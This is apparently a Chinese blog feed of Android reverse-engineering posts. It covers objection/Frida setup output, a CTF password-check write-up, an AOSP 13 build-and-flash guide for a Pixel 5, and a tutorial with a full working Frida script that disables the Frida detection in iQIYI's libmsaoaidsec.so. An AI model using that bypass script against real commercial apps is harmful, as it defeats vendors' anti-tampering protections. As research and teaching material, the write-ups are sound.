└─$ objection -N -h 192.168.1.8 -p 8888 -g com.android.settings explore
Using networked device @`192.168.1.8:8888`


A newer version of objection is available!
You have v1.8.4 and v1.11.0 is ready for download.

Upgrade with: pip3 install objection --upgrade
For more information, please see: https://github.com/sensepost/objection/wiki/Updating

Agent injected and responds ok!

     _   _         _   _
 ___| |_|_|___ ___| |_|_|___ ___
| . | . | | -_|  _|  _| | . |   |
|___|___| |___|___|_| |_|___|_|_|
      |___|(object)inject(ion) v1.8.4

     Runtime Mobile Exploration
        by: @leonjza from @sensepost

[tab] for command suggestions
com.android.settings on (google: 10) [net] # frid                                                                                                                                                                                  
Unknown or ambiguous command: `frid`. Try `help frid`.
com.android.settings on (google: 10) [net] # frida                                                                                                                                                                                 
--------------------  -----------
Frida Version         12.8.0
Process Architecture  arm64
Process Platform      linux
Debugger Attached     False
Script Runtime        DUK
Script Filename       /script1.js
Frida Heap Size       16.9 MiB
--------------------  -----------
com.android.settings on (google: 10) [net] #  
</code></pre>
</blockquote>
<p>其它参考链接：</p>
<p><a href="https://blog.csdn.net/kfyzjd2008/article/details/126786390">看雪2W课-Frida逆向与利用自动化 Frida开发和调试环境搭建 课时1_frida自动化-CSDN博客</a></p>
<p><a href="https://www.daixiaohou.com/693.html">2023：Frida完美安装方案-呆小猴 (daixiaohou.com)</a></p>
<p><a href="https://bbs.kanxue.com/thread-273728.htm">【基础篇】Frida学习环境配置-Kali-2022</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida逆向与利用自动化</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>简易闯关</title>
    <url>/2024/07/29/%E7%AE%80%E6%98%93%E9%97%AF%E5%85%B3/</url>
    <content><![CDATA[<p>打开App</p>
<img src="/2024/07/29/%E7%AE%80%E6%98%93%E9%97%AF%E5%85%B3/image-20240724224049015.png" class="" title="image-20240724224049015">

<ul>
<li>显然是需要输入密码</li>
</ul>
<p>没有壳直接使用jadx打开分析</p>
<img src="/2024/07/29/%E7%AE%80%E6%98%93%E9%97%AF%E5%85%B3/image-20240724214734459.png" class="" title="image-20240724214734459">

<ul>
<li>按钮点击的逻辑</li>
</ul>
<pre><code class="js">public class Check {
    public boolean checkPassword(String str) {
        char[] pass = str.toCharArray();
        if (pass.length != 12) {  // 检查密码长度是否为12
            return false;
        }
        for (int len = 0; len &lt; pass.length; len++) {
            pass[len] = (char) (((255 - len) - 100) - pass[len]);  // 修改密码字符
            if (pass[len] != '0' || len &gt;= 12) {  // 检查修改后的字符是否为'0'以及索引是否小于12
                return false;
            }
        }
        return true;  // 如果所有字符都通过了检查，则返回true
    }
}
</code></pre>
<blockquote>
<p>反解这个算法，我们重点看内层的判断</p>
<pre><code class="js">pass[len] = (char) (((255 - len) - 100) - pass[len]);
if (pass[len] != '0' || len &gt;= 12) {
 return false;
}
</code></pre>
<p><code>pass[len]</code> 必须变成 <code>'0'</code> 才能继续循环下一次验证</p>
<h6 id="逆向计算"><a href="#逆向计算" class="headerlink" title="逆向计算"></a>逆向计算</h6><p>令 <code>pass[len]</code> 最终等于 <code>'0'</code> (ASCII码值48):</p>
<p><code>48 = (255 - len) - 100 - 原始字符值</code></p>
<p>简化方程式得到字符串值：</p>
<pre><code class="js">原始字符串 = （255 - len) - 100 - 48
原始字符串 = 107 - len
</code></pre>
<p>那么就可以得到每个位置上的原始字符值<code>pass[0~11]</code>：</p>
<pre><code class="js">len = 0, 原始字符值 = 107 - 0 = 107 (字符 'k')
len = 1, 原始字符值 = 107 - 1 = 106 (字符 'j')
len = 2, 原始字符值 = 107 - 2 = 105 (字符 'i')
len = 3, 原始字符值 = 107 - 3 = 104 (字符 'h')
len = 4, 原始字符值 = 107 - 4 = 103 (字符 'g')
len = 5, 原始字符值 = 107 - 5 = 102 (字符 'f')
len = 6, 原始字符值 = 107 - 6 = 101 (字符 'e')
len = 7, 原始字符值 = 107 - 7 = 100 (字符 'd')
len = 8, 原始字符值 = 107 - 8 = 99 (字符 'c')
len = 9, 原始字符值 = 107 - 9 = 98 (字符 'b')
len = 10, 原始字符值 = 107 - 10 = 97 (字符 'a')
len = 11, 原始字符值 = 107 - 11 = 96 (字符 '`')
</code></pre>
<p>查ASCII码表比较麻烦，可以写个循环计算出结果：</p>
<pre><code class="python">for i in range(12):
 charValue = 255 - i - 100 - 48
 print(chr(charValue), end='')
</code></pre>
<p>计算出的原始密码：</p>
<pre><code class="js">kjihgfedcba`
</code></pre>
</blockquote>
<img src="/2024/07/29/%E7%AE%80%E6%98%93%E9%97%AF%E5%85%B3/image-20240725082224357.png" class="" title="image-20240725082224357">

<img src="/2024/07/29/%E7%AE%80%E6%98%93%E9%97%AF%E5%85%B3/image-20240725081841696.png" class="" title="image-20240725081841696">

<img src="/2024/07/29/%E7%AE%80%E6%98%93%E9%97%AF%E5%85%B3/image-20240725084113408.png" class="" title="image-20240725084113408">

<p>再看下<code>MainActivity2</code>的处理逻辑</p>
<img src="/2024/07/29/%E7%AE%80%E6%98%93%E9%97%AF%E5%85%B3/image-20240725091142308.png" class="" title="image-20240725091142308">

<ul>
<li>点击按钮之后就发送了一个广播</li>
</ul>
<p>这里静态注册了广播接收器</p>
<img src="/2024/07/29/%E7%AE%80%E6%98%93%E9%97%AF%E5%85%B3/image-20240725092159929.png" class="" title="image-20240725092159929">

<p>打开接收广播的类看看</p>
<img src="/2024/07/29/%E7%AE%80%E6%98%93%E9%97%AF%E5%85%B3/image-20240725093532061.png" class="" title="image-20240725093532061">

<ul>
<li>这里也没做什么，只是调用了<code>NextContent</code>类</li>
</ul>
<p><code>NextContent</code>类</p>
<img src="/2024/07/29/%E7%AE%80%E6%98%93%E9%97%AF%E5%85%B3/image-20240725101607806.png" class="" title="image-20240725101607806">

<ul>
<li>获取应用程序数据库路径 <code>img.jpg</code> 文件的绝对路径。</li>
<li>检查文件是否存在，存在则删除该文件。</li>
<li>从应用程序的 assets 目录中打开 <code>timg_2.zip</code> 文件。</li>
<li>将 <code>timg_2.zip</code> 文件的内容复制到 <code>img.jpg</code> 文件中。</li>
<li>将 <code>img.jpg</code> 文件解码为位图，并将其设置为 <code>ImageView</code> 的图像。</li>
<li>总的来说，这里就打开了一张图片</li>
</ul>
<p>那我们这里直接使用objection拉起这个<code>Activity</code>看看效果</p>
<img src="/2024/07/29/%E7%AE%80%E6%98%93%E9%97%AF%E5%85%B3/image-20240725105504570.png" class="" title="image-20240725105504570">

<img src="/2024/07/29/%E7%AE%80%E6%98%93%E9%97%AF%E5%85%B3/image-20240729101708815.png" class="" title="image-20240729101708815">
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>编译Android13-AOSP</title>
    <url>/2024/08/10/%E7%BC%96%E8%AF%91Android13-AOSP/</url>
    <content><![CDATA[<p>本文主要是下载Android13 AOSP源码，并将其编译后刷入设备</p>
<h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><blockquote>
<p>编译环境：Ubuntu 22.04 TLS，需要配置好科学上网</p>
<blockquote>
<p>硬盘最少要300G以上，内存最少要16G以上</p>
<p>源码下载和编译都比较花时间</p>
<p>在12个线程的情况下给20G内存就足够了，太多了也用不到</p>
<img src="/2024/08/10/%E7%BC%96%E8%AF%91Android13-AOSP/image-20240804171502075.png" class="" title="image-20240804171502075">
</blockquote>
<p>设备：pixel 5</p>
</blockquote>
<h3 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h3><h4 id="1-安装-Repo-工具"><a href="#1-安装-Repo-工具" class="headerlink" title="1. 安装 Repo 工具"></a>1. 安装 Repo 工具</h4><p>Repo 工具用于管理 Git 仓库</p>
<pre><code class="bash">mkdir ~/bin
curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo
chmod a+x ~/bin/repo
</code></pre>
<h4 id="2-设置-Java-环境"><a href="#2-设置-Java-环境" class="headerlink" title="2. 设置 Java 环境"></a>2. 设置 Java 环境</h4><p>确保安装的是 OpenJDK 11：</p>
<pre><code>sudo update-alternatives --config java
sudo update-alternatives --config javac
</code></pre>
<p>如果还未安装 OpenJDK 11，可以通过以下命令安装：</p>
<pre><code>sudo apt install openjdk-11-jdk
</code></pre>
<h4 id="3-安装依赖："><a href="#3-安装依赖：" class="headerlink" title="3. 安装依赖："></a>3. 安装依赖：</h4><pre><code class="bash">sudo apt-get update
sudo apt-get install git openjdk-11-jdk flex bison gperf build-essential \
zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 \
lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev \
libxml2-utils xsltproc unzip fontconfig python-is-python3 libncurses5
</code></pre>
<h3 id="下载和编译-Android-13-源码"><a href="#下载和编译-Android-13-源码" class="headerlink" title="下载和编译 Android 13 源码"></a>下载和编译 Android 13 源码</h3><h4 id="1-创建源码目录"><a href="#1-创建源码目录" class="headerlink" title="1. 创建源码目录"></a>1. 创建源码目录</h4><pre><code>mkdir ~/android-aosp
cd ~/android-aosp
</code></pre>
<h4 id="2-切换为国内源"><a href="#2-切换为国内源" class="headerlink" title="2. 切换为国内源"></a>2. 切换为国内源</h4><ol>
<li><p>备份原始的源列表</p>
<p><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></p>
</li>
<li><p>编辑源列表</p>
<p><code>sudo nano /etc/apt/sources.list</code></p>
</li>
<li><p>替换默认源</p>
<pre><code class="bash">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse
deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse

deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse
deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse

deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse
deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse

deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse
deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse
</code></pre>
</li>
<li><p>更新软件包索引</p>
<p><code>sudo apt update</code></p>
</li>
</ol>
<h4 id="3-初始化-Repo"><a href="#3-初始化-Repo" class="headerlink" title="3. 初始化 Repo"></a>3. 初始化 Repo</h4><p>初始化 AOSP 源码仓库：</p>
<pre><code>repo init -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-13.0.0_r40
</code></pre>
<h4 id="4-同步源码"><a href="#4-同步源码" class="headerlink" title="4. 同步源码"></a>4. 同步源码</h4><pre><code>repo sync -c -j$(nproc) --no-clone-bundle --current-branch
</code></pre>
<img src="/2024/08/10/%E7%BC%96%E8%AF%91Android13-AOSP/image-20240805100950854.png" class="" title="image-20240805100950854">

<h4 id="5-下载vendor"><a href="#5-下载vendor" class="headerlink" title="5. 下载vendor"></a>5. 下载vendor</h4><p>在AOSP（Android Open Source Project）源码中，<code>vendor</code> 目录有时可能会缺失，因为AOSP的基础源码通常只包含Android系统的核心部分和一些通用的硬件抽象层（HAL）实现。<code>vendor</code> 目录通常用于存放设备厂商的特定实现、定制和其他与硬件相关的代码</p>
<p>我们这里使用的设备是pixel 5直接去<a href="https://developers.google.com/android/drivers?hl=zh-cn">Google官方驱动下载页面</a>下载合适的驱动，选择和下载的AOSP版本号对应的驱动：</p>
<p><a href="https://source.android.com/docs/setup/reference/build-numbers?hl=zh-cn">查找源码标记</a></p>
<img src="/2024/08/10/%E7%BC%96%E8%AF%91Android13-AOSP/image-20240806082559753.png" class="" title="image-20240806082559753">

<p>去下载<code>android-13.0.0_r69</code>对应的驱动</p>
<img src="/2024/08/10/%E7%BC%96%E8%AF%91Android13-AOSP/image-20240806083101484.png" class="" title="image-20240806083101484">

<ul>
<li>将下载的压缩包解压</li>
</ul>
<p>执行解压后的<code>.sh</code>文件会得到vendor目录</p>
  <img src="/2024/08/10/%E7%BC%96%E8%AF%91Android13-AOSP/image-20240804095159520.png" class="" title="image-20240804095159520">

<ul>
<li><p>将vendor目录放到源码中即可</p>
<img src="/2024/08/10/%E7%BC%96%E8%AF%91Android13-AOSP/image-20240806083641855.png" class="" title="image-20240806083641855"></li>
</ul>
<h3 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h3><h4 id="1-设置构建环境"><a href="#1-设置构建环境" class="headerlink" title="1. 设置构建环境"></a>1. 设置构建环境</h4><pre><code>source build/envsetup.sh
</code></pre>
<h4 id="2-选择目标设备"><a href="#2-选择目标设备" class="headerlink" title="2. 选择目标设备"></a>2. 选择目标设备</h4><p>查看支持的设备列表并选择：</p>
<pre><code>lunch
</code></pre>
<img src="/2024/08/10/%E7%BC%96%E8%AF%91Android13-AOSP/image-20240806074036281.png" class="" title="image-20240806074036281">

<p>例如选择 <code>aosp_redfin-userdebug</code>：</p>
<pre><code>36
</code></pre>
<h4 id="3-开始编译"><a href="#3-开始编译" class="headerlink" title="3. 开始编译"></a>3. 开始编译</h4><pre><code>make -j$(nproc)
</code></pre>
<img src="/2024/08/10/%E7%BC%96%E8%AF%91Android13-AOSP/image-20240806151656071.png" class="" title="image-20240806151656071">

<ul>
<li>比较花时间，编译了将近4个小时</li>
</ul>
<h3 id="测试和部署"><a href="#测试和部署" class="headerlink" title="测试和部署"></a>测试和部署</h3><h4 id="启动模拟器"><a href="#启动模拟器" class="headerlink" title="启动模拟器"></a>启动模拟器</h4><p>在编译完成后，使用以下命令启动模拟器：</p>
<pre><code>emulator
</code></pre>
<h4 id="在真实设备上刷机"><a href="#在真实设备上刷机" class="headerlink" title="在真实设备上刷机"></a>在真实设备上刷机</h4><ol>
<li><h5 id="刚编译完成直接在源码目录下刷机"><a href="#刚编译完成直接在源码目录下刷机" class="headerlink" title="刚编译完成直接在源码目录下刷机"></a>刚编译完成直接在源码目录下刷机</h5></li>
</ol>
<p>确保设备已连接并处于 fastboot 模式：</p>
<pre><code>adb reboot bootloader
fastboot flashall -w
</code></pre>
<pre><code class="bash">xiaoeryu@xiaoeryu-virtual-machine:~/aosp_r69$ adb reboot bootloader
xiaoeryu@xiaoeryu-virtual-machine:~/aosp_r69$ fastboot flashall -w
--------------------------------------------
Bootloader Version...: r3-0.5-9430389
Baseband Version.....: g7250-00247.1-230113-B-9488784
Serial Number........: 08161FFD4000G9
--------------------------------------------
Checking 'product'                                 OKAY [  0.068s]
Setting current slot to 'b'                        OKAY [  0.525s]
Sending 'boot_b' (98304 KB)                        OKAY [  3.240s]
Writing 'boot_b'                                   OKAY [  1.979s]
Sending 'dtbo_b' (16384 KB)                        OKAY [  0.670s]
Writing 'dtbo_b'                                   OKAY [  0.388s]
Sending 'vbmeta_b' (8 KB)                          OKAY [  0.140s]
Writing 'vbmeta_b'                                 OKAY [  0.079s]
Sending 'vbmeta_system_b' (4 KB)                   OKAY [  0.140s]
Writing 'vbmeta_system_b'                          OKAY [  0.079s]
Sending 'vendor_boot_b' (98304 KB)                 OKAY [  3.390s]
Writing 'vendor_boot_b'                            OKAY [  2.037s]
Rebooting into fastboot                            OKAY [  0.065s]
&lt; waiting for any device &gt;
Sending 'super' (4 KB)                             OKAY [  0.002s]
Updating super partition                           OKAY [  0.035s]
Resizing 'product_b'                               OKAY [  0.005s]
Resizing 'system_b'                                OKAY [  0.005s]
Resizing 'system_ext_b'                            OKAY [  0.006s]
Resizing 'system_a'                                OKAY [  0.005s]
Resizing 'vendor_b'                                OKAY [  0.005s]
Resizing 'vendor_a'                                OKAY [  0.005s]
Invalid sparse file format at header magic
Resizing 'product_b'                               OKAY [  0.006s]
Sending sparse 'product_b' 1/2 (262140 KB)         OKAY [  8.082s]
Writing 'product_b'                                OKAY [  1.405s]
Sending sparse 'product_b' 2/2 (23904 KB)          OKAY [  0.740s]
Writing 'product_b'                                OKAY [  0.179s]
Invalid sparse file format at header magic
Resizing 'system_b'                                OKAY [  0.006s]
Sending sparse 'system_b' 1/4 (262112 KB)          OKAY [  8.083s]
Writing 'system_b'                                 OKAY [  1.408s]
Sending sparse 'system_b' 2/4 (262120 KB)          OKAY [  8.204s]
Writing 'system_b'                                 OKAY [  1.393s]
Sending sparse 'system_b' 3/4 (262140 KB)          OKAY [  8.698s]
Writing 'system_b'                                 OKAY [  1.433s]
Sending sparse 'system_b' 4/4 (65600 KB)           OKAY [  2.512s]
Writing 'system_b'                                 OKAY [  0.388s]
Resizing 'system_ext_b'                            OKAY [  0.006s]
Sending 'system_ext_b' (197268 KB)                 OKAY [  7.841s]
Writing 'system_ext_b'                             OKAY [  1.075s]
Resizing 'system_a'                                OKAY [  0.006s]
Sending 'system_a' (26696 KB)                      OKAY [  0.969s]
Writing 'system_a'                                 OKAY [  0.166s]
Invalid sparse file format at header magic
Resizing 'vendor_b'                                OKAY [  0.006s]
Sending sparse 'vendor_b' 1/3 (262092 KB)          OKAY [  8.710s]
Writing 'vendor_b'                                 OKAY [  1.444s]
Sending sparse 'vendor_b' 2/3 (262116 KB)          OKAY [  8.485s]
Writing 'vendor_b'                                 OKAY [  1.411s]
Sending sparse 'vendor_b' 3/3 (236248 KB)          OKAY [  7.860s]
Writing 'vendor_b'                                 OKAY [  1.271s]
Erasing 'userdata'                                 OKAY [  6.665s]
Erase successful, but not automatically formatting.
File system type raw not supported.
Erasing 'metadata'                                 OKAY [  0.044s]
Erase successful, but not automatically formatting.
File system type raw not supported.
Rebooting                                          OKAY [  0.000s]
Finished. Total time: 1517.077s
</code></pre>
<ul>
<li><p>这里使用了<code>-w</code>来擦除之前分区的内容</p>
<img src="/2024/08/10/%E7%BC%96%E8%AF%91Android13-AOSP/image-20240810093236811.png" class="" title="image-20240810093236811"></li>
</ul>
<ol start="2">
<li><h5 id="将镜像拷贝出来刷机"><a href="#将镜像拷贝出来刷机" class="headerlink" title="将镜像拷贝出来刷机"></a>将镜像拷贝出来刷机</h5><img src="/2024/08/10/%E7%BC%96%E8%AF%91Android13-AOSP/image-20240804101618858.png" class="" title="image-20240804101618858">

<ul>
<li>应该就是这几个，暂时没尝试回头试试再补上</li>
</ul>
<pre><code class="base">fastboot flash boot boot.img
fastboot flash system system.img
fastboot flash vendor vendor.img
fastboot flash vbmeta vbmeta.img
fastboot flash userdata userdata.img
</code></pre>
</li>
</ol>
<h3 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h3><ol>
<li><p>iftop可以监控网络接口的上传和下载速度</p>
<p><code>sudo apt install htop</code></p>
<p><code>sudo htop</code></p>
</li>
<li><p>htop可以监控资源进程和硬件使用情况</p>
<p><code>sudo apt install iftop</code></p>
<p><code>sudo iftop</code></p>
</li>
</ol>
<h6 id="PS：没有vendor-img的话刷出来无法开机"><a href="#PS：没有vendor-img的话刷出来无法开机" class="headerlink" title="PS：没有vendor.img的话刷出来无法开机"></a>PS：没有vendor.img的话刷出来无法开机</h6><h6 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h6><p><a href="https://www.cnblogs.com/bujiangjiu/p/17716052.html">使用Google Pixel5手机调试AOSP(代码下载、编译、刷机、调试)详细攻略</a></p>
<hr>
<h3 id="相关话题："><a href="#相关话题：" class="headerlink" title="相关话题："></a>相关话题：</h3><ol>
<li><p>自己编译的安卓源码要装谷歌框架，需要刷gapp，而opengapp又比较老了，此时有一些新的选择：</p>
<p><a href="https://nikgapps.com/">nikgapps</a></p>
<p><a href="https://mindthegapps.com/">mindthegapps</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>AOSP源码编译</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过爱奇艺libmsaoaidsec.so的Frida检测</title>
    <url>/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<p>本文中所有内容仅供研究与学习使用，请勿用于任何商业用途和非法用途，否则后果自负！</p>
<p>下面主要分析了如何定位Frida检测位置，以及定位后如何绕过的问题。其原理参见之前写的<a href="https://xiaoeeyu.github.io/2024/03/25/libcHook/">libcHook</a></p>
<h2 id="0x00：环境"><a href="#0x00：环境" class="headerlink" title="0x00：环境"></a>0x00：环境</h2><p>设备：Google Pixel 5</p>
<p>系统版本：Android 13</p>
<p>版本号：TQ2A.230405.003.B2</p>
<p>Frida-Server：16.2.1</p>
<p>爱奇艺：15.7.5</p>
<h2 id="0x01：问题"><a href="#0x01：问题" class="headerlink" title="0x01：问题"></a>0x01：问题</h2><p>爱奇艺有反Frida机制，在我们使用Frida启动App的时候进程会被干掉</p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240807181833519.png" class="" title="image-20240807181833519">

<center>图0</center>

<h2 id="0x02：分析"><a href="#0x02：分析" class="headerlink" title="0x02：分析"></a>0x02：分析</h2><p>Frida检测一般都是在Native层实现的，那么我们首先需要定位检测机制是在哪个so中实现的，这里我们就需要先hook Android的动态链接库加载函数，观察它加载到哪个so的时候会崩溃</p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240807185049751.png" class="" title="image-20240807185049751">

<center>图1 android_dlopen_ext原型</center>

<p>hook <code>android_dlopen_ext</code>查看so的加载流程</p>
<pre><code class="js">function hook_dlopen() {
    Interceptor.attach(Module.findExportByName(null, "android_dlopen_ext"),
        {
            onEnter: function (args) {
                this.fileName = args[0].readCString()
                console.log(`dlopen onEnter: ${this.fileName}`)
            }, onLeave: function(retval){
                console.log(`dlopen onLeave fileName: ${this.fileName}`)
                if(this.fileName != null &amp;&amp; this.fileName.indexOf("libmsaoaidsec.so") &gt;= 0){
                    let JNI_OnLoad = Module.getExportByName(this.fileName, 'JNI_OnLoad')
                    console.log(`dlopen onLeave JNI_OnLoad: ${JNI_OnLoad}`)
                }
            }
        }
    );
}

setImmediate(hook_dlopen)
</code></pre>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240807214508434.png" class="" title="image-20240807214508434">

<center>图2</center>

<ul>
<li>从打印的log可以看到最后一个加载的so是<code>libmsaoaidsec.so</code>，并且没有调用<code>onLeave</code>，由此可知崩溃点就在<code>libmsaoaidsec.so</code>中，并且是在<code>JNI_OnLoad</code>之前检测的，so在加载之后会先调用<code>.init_proc</code>函数，接着调用<code>.init_array</code>中的函数，最后才是<code>JNI_OnLoad</code>函数，所以根据log可以确定检测点在<code>JNI_OnLoad</code>之前，接下来选择的注入时机可以选择在<code>dlopen</code>加载<code>libmsaoaidsec.so</code>之后</li>
</ul>
<p>需要注意的一点是在<code>dlopen</code>函数调用完成之后<code>.init_xxx</code>已经执行完成了</p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240807220025518.png" class="" title="image-20240807220025518">

<center>图3 源码截图</center>

<ul>
<li>那么我们就hook这里的<code>call_constructors</code>函数，在onEnter里注入代码</li>
</ul>
<p>在设备中找到<code>call_constructors</code>的offset</p>
<p><code>readelf -sW /apex/com.android.runtime/bin/linker64 | grep call_constructors</code></p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240807223922777.png" class="" title="image-20240807223922777">

<pre><code class="js">function hook_linker_call_constructors() {
    let linker64_base_addr = Module.getBaseAddress('linker64')
    let offset = 0x4e4dc    // __dl__ZN6soinfo17call_constructorsEv
    let call_constructors = linker64_base_addr.add(offset)
    let listener = Interceptor.attach(call_constructors,{
        onEnter:function(args){
            console.log('hook_linker_call_constructors onEnter')
            let secmodule = Process.findModuleByName("libmsaoaidsec.so")
            if (secmodule != null){
                // do something
            }
        }
    })
}
</code></pre>
<p>确定hook点了之后，接下来定位具体的Frida检测点</p>
<p>对Frida的检测通常会使用openat、open、strstr、pthread_create、snprintf、sprintf、readlinkat等一系列函数</p>
<h4 id="hook-pthread-create-定位检测点"><a href="#hook-pthread-create-定位检测点" class="headerlink" title="hook pthread_create 定位检测点"></a>hook <code>pthread_create</code> 定位检测点</h4><p>我们这里对<code>pthread_create</code>进行hook，打印新线程要执行的函数地址</p>
<pre><code class="js">function hook_pthred_create(){
    console.log("libmsaoaidsec.so --- " + Process.findModuleByName("libmsaoaidsec.so").base)
    Interceptor.attach(Module.findExportByName('libc.so','pthread_create'),{
        onEnter(args){
            let func_addr = args[2]
            console.log(`The thread Called function address is: ${func_addr}`)
        }
    })
}
</code></pre>
<p>执行脚本：<code>frida -U -f com.qiyi.video -l tmp03.js</code></p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240807230428971.png" class="" title="image-20240807230428971">

<center>图4</center>

<ul>
<li><p>根据打印的结果可以看到有两个线程是libmsaoaidsec.so创建的</p>
<blockquote>
<p>计算对应的偏移:</p>
<p>libmsaoaidsec.so — 0x7a27c43000</p>
<p>The thread Called function address is: 0x7a27c5e8d4		偏移-&gt; 1B8D4<br>The thread Called function address is: 0x7a27c69e5c		偏移-&gt; 26E5C</p>
</blockquote>
</li>
</ul>
<p>既然<strong>libmsaoaidsec.so</strong>创建了两个线程，猜测这其中起码有一个是和Frida检测有关的</p>
<p>用IDA打开libmsaoaidsec.so，查找偏移</p>
<p>查看<code>0x1B8D4</code>地址处对应的函数</p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240807232702784.png" class="" title="image-20240807232702784">

<center>图5</center>

<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240807233048464.png" class="" title="image-20240807233048464">

<center>图6</center>

<ul>
<li>使用交叉引用往上查找</li>
</ul>
<p>到了上一层，这里的<code>v26</code>应该就是<code>pthred_create</code>了</p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240807233934309.png" class="" title="image-20240807233934309">

<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240807233856368.png" class="" title="image-20240807233856368">

<center>图7</center>

<p>这里绕过的方法很简单，可以选择直接nop掉<code>pthread_create</code>或者替换检测函数的代码逻辑都可以，我们这里选择replace掉<code>sub_1b924</code></p>
<h2 id="0x03：最终代码"><a href="#0x03：最终代码" class="headerlink" title="0x03：最终代码"></a>0x03：最终代码</h2><pre><code class="js">function hook_dlopen() {
    Interceptor.attach(Module.findExportByName(null, "android_dlopen_ext"),
        {
            onEnter: function (args) {
                this.fileName = args[0].readCString()
                console.log(`dlopen onEnter: ${this.fileName}`)
                if (this.fileName !== undefined &amp;&amp; this.fileName.indexOf("libmsaoaidsec.so") &gt;= 0) {
                    hook_linker_call_constructors()
                }
            }, onLeave: function (retval) {
                console.log(`dlopen onLeave fileName: ${this.fileName}`)
                if (this.fileName != null &amp;&amp; this.fileName.indexOf("libmsaoaidsec.so") &gt;= 0) {
                    let JNI_OnLoad = Module.getExportByName(this.fileName, 'JNI_OnLoad')
                    console.log(`dlopen onLeave JNI_OnLoad: ${JNI_OnLoad}`)
                }
            }
        }
    );
}

function hook_linker_call_constructors() {
    let linker64_base_addr = Module.getBaseAddress('linker64')
    let offset = 0x4e4dc    // __dl__ZN6soinfo17call_constructorsEv
    let call_constructors = linker64_base_addr.add(offset)
    let listener = Interceptor.attach(call_constructors,{
        onEnter:function(args){
            console.log('hook_linker_call_constructors onEnter')
            let secmodule = Process.findModuleByName("libmsaoaidsec.so")
            if (secmodule != null){
                // do something
                // hook_pthred_create()
                hook_sub_1b924()
                listener.detach()
            }
        }
    })
}

function hook_pthred_create(){
    console.log("libmsaoaidsec.so --- " + Process.findModuleByName("libmsaoaidsec.so").base)
    Interceptor.attach(Module.findExportByName('libc.so','pthread_create'),{
        onEnter(args){
            let func_addr = args[2]
            console.log(`The thread Called function address is: ${func_addr}`)
        }
    })
}

function hook_sub_1b924() {
    let secmodule = Process.findModuleByName("libmsaoaidsec.so")
    Interceptor.replace(secmodule.base.add(0x1B924), new NativeCallback(function () {
      console.log(`hook_sub_1b924 &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; replace`)
    }, 'void', []));
  }

setImmediate(hook_dlopen)
</code></pre>
